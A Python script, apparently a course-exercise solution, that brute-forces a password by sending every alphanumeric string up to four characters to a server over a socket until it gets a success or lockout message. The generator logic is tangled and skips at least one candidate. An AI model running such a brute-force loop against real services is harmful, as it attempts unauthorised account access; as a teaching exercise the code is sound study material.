import argparse
import itertools
import socket
import string


def hack():
    alphabet = [i for i in string.ascii_lowercase]
    numbers = [i for i in string.digits]
    alphnumb = alphabet + numbers

    for j in alphnumb:
        level = 1
        if j != alphnumb[-1]:
            yield j
        if j == alphnumb[-1]:
            level = 2
            yield j
        if level == 2:
            for h, k in itertools.product(alphnumb, alphnumb):
                if h + k != alphnumb[-1] + alphnumb[-1]:
                    yield h + k
                if h + k == alphnumb[-1] + alphnumb[-1]:
                    level = 3
                    yield h + k
                if level == 3:
                    for l, m, n in itertools.product(alphnumb, alphnumb, alphnumb):
                        if l + m + n != alphnumb[-1] + alphnumb[-1] + alphnumb[-1]:
                            yield l + m + n
                        if l + m + n == alphnumb[-1] + alphnumb[-1] + alphnumb[-1]:
                            level = 4
                        if level == 4:
                            for o, p, q, r in itertools.product(alphnumb, alphnumb, alphnumb, alphnumb):
                                yield o + p + q + r


hack_generator = hack()
max_n = 100000

parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")

args = parser.parse_args()

client = socket.socket()
address = (args.host, int(args.port))
client.connect(address)

for i in range(max_n):
    attempt = next(hack_generator)
    message = attempt.encode()
    client.send(message)
    response = client.recv(1024)
    response = response.decode()
    if response == "Connection success!":
        break
    elif response == "Too many attempts!":
        break

print(attempt)
client.close()


